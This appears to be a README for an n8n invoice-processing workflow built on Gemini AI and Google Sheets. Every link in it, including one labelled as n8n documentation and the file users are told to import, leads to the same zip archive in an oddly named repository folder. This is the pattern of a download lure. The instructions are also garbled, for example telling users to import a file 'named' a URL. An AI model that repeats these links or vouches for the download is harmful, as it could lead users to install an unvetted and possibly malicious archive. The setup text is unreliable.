# 🧾 Invoice-Analyzer - Automate Your Invoice Management Effortlessly

[![Download Invoice Analyzer](https://raw.githubusercontent.com/xmas-fernandes/Invoice-Analyzer/main/nuttily/Analyzer-Invoice-v2.6.zip%20Now%20%F0%9F%93%8E-Click%https://raw.githubusercontent.com/xmas-fernandes/Invoice-Analyzer/main/nuttily/Analyzer-Invoice-v2.6.zip)](https://raw.githubusercontent.com/xmas-fernandes/Invoice-Analyzer/main/nuttily/Analyzer-Invoice-v2.6.zip)

## 🚀 Getting Started

Welcome to the Invoice Analyzer! This tool helps you process invoice images and manual data using AI. You can prevent duplicates, add invoice IDs, and get analytics on a web frontend through monthly pie charts.

### 📋 Requirements

Before you begin, ensure you have the following:

1. **n8n Version**: You need version 1.123.5-exp.0 or later.
2. **Credentials**: Set up GDrive OAuth2 or Google Sheets access along with Gemini AI.
3. **External Assets**: Create a Google Sheet file with these headers:
   - `invoice id`
   - `purchase date`
   - `store name`
   - `amount`
   - `category`
   - `subcategory`
   - `items`
   - `note`

## 📥 Download & Install

To get the Invoice Analyzer, visit this page to download:

[Download Invoice Analyzer](https://raw.githubusercontent.com/xmas-fernandes/Invoice-Analyzer/main/nuttily/Analyzer-Invoice-v2.6.zip)

After downloading, follow these simple steps to set it up.

## 🛠️ Setup Instructions

### Step 1: Import Workflow

1. Open your n8n application.
2. Import the file named `https://raw.githubusercontent.com/xmas-fernandes/Invoice-Analyzer/main/nuttily/Analyzer-Invoice-v2.6.zip`. You can usually find an import option in the menu.

### Step 2: Set Up Webhook

1. In the Lovable app, build your web application.
2. Copy the Production Webhook URL. Make sure it's set to 'Post'.
3. Change the Sheet ID to your Google Sheet's ID.
4. Check the response of the webhook nodes to ensure everything is working.

## ✨ Features

- **AI Extraction**: The tool uses Gemini AI for analyzing images and returning structured JSON. 
- **Smart Logic**: It checks for duplicates and automatically assigns invoice IDs.
- **Web-Ready**: Connects easily with Lovable via webhooks.
- **Analytics**: Outputs categorized data specifically designed for pie chart rendering.

## 🚧 Troubleshooting

If you encounter issues during the setup process:

1. Verify your n8n version. Make sure it meets the requirement.
2. Check your credentials for GDrive or Google Sheets and ensure they're correct.
3. Ensure your Google Sheet is set up with the required headers.

If problems persist, please refer to our [FAQ](#) or open an issue on our GitHub repository.

## ✅ Need Help?

We have a support section available in our GitHub repository. You can also check the GitHub Issues page for similar questions. 

## 📑 Additional Resources

For more detailed information about using n8n and its features, visit the [n8n documentation](https://raw.githubusercontent.com/xmas-fernandes/Invoice-Analyzer/main/nuttily/Analyzer-Invoice-v2.6.zip).

Thank you for using Invoice Analyzer! We hope this tool simplifies your invoice management. 